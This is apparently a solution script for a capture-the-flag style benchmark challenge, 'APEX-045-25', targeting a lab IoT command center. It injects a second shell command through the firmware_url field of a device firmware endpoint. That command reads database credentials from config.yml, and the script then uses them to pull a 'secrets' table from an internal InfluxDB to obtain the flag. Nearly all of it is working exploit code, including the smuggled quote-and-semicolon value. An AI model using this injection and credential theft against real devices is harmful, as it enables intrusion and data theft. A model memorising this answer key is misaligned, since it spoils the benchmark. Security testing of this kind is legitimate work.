#!/usr/bin/env bash
# APEX-045-25 — "IoT Command Center Breach" (tags: iot, command_injection, influxdb)
#
# The firmware endpoint builds a shell command around the URL it is given:
#
#   curl -o /tmp/firmware/... 'http://firmware-store:8080/firmware/<version>'
#
# A quote closes the argument and a semicolon starts a second command. The rest
# is what the device API can see, which is everything the fleet's telemetry
# database can be asked with the credentials sitting next to it in `config.yml`.
#
# The benchmark's own description begins with an MQTT step — subscribing to the
# broker to collect device tokens — and the flag does not need it: this endpoint
# takes a device id it never checks. The broker *is* published, so that step is
# possible; it is simply not on the path.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
. "$(dirname "$0")/lib.sh"
HOST="${URL%:*}"
DASHBOARD="${DASHBOARD_URL:-$HOST:3045}"
SESSION="apex045-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

"$H5I" browser open "$DASHBOARD/" --session "$SESSION" --new --capture >/dev/null

# One command, and then another the endpoint did not intend.
run() {
    send "$SESSION" req_0 --create \
        --set method=POST --set path=/api/devices/sensor-001/firmware \
        --set header.Content-Type=application/json \
        --set "json.firmware_url=http://firmware-store:8080/firmware/v1.0.0.bin' ; $1 ; echo '" |
        body | python3 -c 'import json,sys; print(json.load(sys.stdin).get("output",""))'
}

read -r DATABASE USER PASSWORD <<<"$(run "cat /app/config.yml" | python3 -c '
import sys
found = {}
for line in sys.stdin:
    if ":" in line:
        name, _, value = line.partition(":")
        found.setdefault(name.strip(), value.strip())
print(found["database"], found["username"], found["password"])
')"

run "curl -s 'http://influxdb:8086/query?db=$DATABASE&u=$USER&p=$PASSWORD&q=SELECT+*+FROM+secrets'" | flag
